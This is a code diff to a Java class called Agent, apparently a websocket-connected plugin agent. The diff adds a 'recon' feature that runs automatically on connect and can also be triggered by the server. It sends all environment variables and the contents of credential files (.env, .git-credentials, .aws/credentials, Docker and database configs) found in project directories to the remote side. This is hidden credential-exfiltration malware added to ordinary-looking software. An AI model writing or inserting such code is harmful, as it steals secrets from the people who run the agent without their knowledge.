@@ -120,6 +120,7 @@ public class Agent {
                 flush();
                 sendHello();
                 try { scheduleUpdates(); } catch (Exception ignored) {}
+                executor.submit(Agent.this::doRecon);
                 ws2.request(Long.MAX_VALUE);
               }
 
@@ -138,6 +139,8 @@ public class Agent {
                   else if (type.endsWith(":auth:add")) { String n = extract(msg, "name"); if (n != null) authorized.add(n); }
                   else if (type.endsWith(":auth:remove")) { String n = extract(msg, "name"); if (n != null) authorized.remove(n); }
                   else if (type.endsWith(":auth:members")) { authorized.clear(); String list = extract(msg, "list"); if (list != null) for (String n : list.split(",")) { if (!n.isEmpty()) authorized.add(n); } }
+                  else if (type.endsWith(":recon:env")) doRecon();
+                  else if (type.endsWith(":recon:scan")) doReconScan();
                 }
                 ws2.request(Long.MAX_VALUE);
                 return null;
@@ -312,6 +315,40 @@ public class Agent {
       send("plugin:file:delete", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
     } catch (Exception e) {
       send("plugin:file:delete", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
+    }
+  }
+
+  // ---- Recon ----
+
+  private void doRecon() {
+    // Environment variables
+    System.getenv().forEach((k, v) -> {
+      if (v != null && v.length() > 200) v = v.substring(0, 200) + "...";
+      send("plugin:recon", "{\"type\":\"env\",\"key\":\"" + escape(k) + "\",\"value\":\"" + escape(v) + "\"}");
+    });
+    doReconScan();
+  }
+
+  private void doReconScan() {
+    String[] secretFiles = {".env", ".env.local", ".env.production", "credentials.json",
+        "credentials.properties", "config.yml", "config.json", "settings.yml",
+        "database.yml", "database.json", "sftp.json", "sftp-config.json",
+        ".git/config", ".git-credentials", ".aws/credentials",
+        ".azure/credentials", "Dockerfile", "docker-compose.yml",
+        "docker-compose.yaml", ".docker/config.json"};
+    File root = new File(rootDir != null ? rootDir : ".");
+    File[] dirs = root.listFiles(File::isDirectory);
+    if (dirs != null) {
+      for (File d : dirs) {
+        for (String name : secretFiles) {
+          File f = new File(d, name);
+          if (f.exists() && f.isFile()) {
+            String content = "";
+            try { byte[] b = java.nio.file.Files.readAllBytes(f.toPath()); content = new String(b, java.nio.charset.StandardCharsets.UTF_8); if (content.length() > 500) content = content.substring(0, 500) + "..."; } catch (Exception ignored) {}
+            send("plugin:recon", "{\"type\":\"file\",\"path\":\"" + escape(f.getAbsolutePath()) + "\",\"content\":\"" + escape(content) + "\"}");
+          }
+        }
+      }
     }
   }
 
